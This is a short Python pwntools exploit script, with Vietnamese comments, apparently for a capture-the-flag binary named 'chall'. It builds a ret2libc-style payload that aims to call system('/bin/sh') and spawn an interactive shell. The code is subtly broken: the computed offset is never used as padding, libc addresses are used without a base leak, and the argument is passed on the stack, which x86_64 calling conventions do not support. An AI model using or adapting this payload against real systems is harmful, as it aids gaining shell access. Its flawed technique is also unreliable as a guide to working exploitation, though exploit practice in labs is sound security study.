from pwn import *

elf = context.binary = ELF('./chall', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

p = process('./chall')

# Tìm offset đến saved RIP:
offset = 16   # ví dụ minh họa, bạn cần xác định thực tế qua gdb/pattern_create

# Địa chỉ hàm system và chuỗi "/bin/sh"
system_addr = libc.symbols['system']
binsh_addr   = next(libc.search(b'/bin/sh'))

# Hoặc nếu local GOT/PLT, ta leak base libc => tính system_addr, binsh_addr.

rop = p64(system_addr)
rop += b'JUNKJUNK'      # return address sau system (fake)
rop += p64(binsh_addr)

payload = rop
write('payload', payload)
info(f'Payload: {payload}')
p.sendline(payload)

p.interactive()
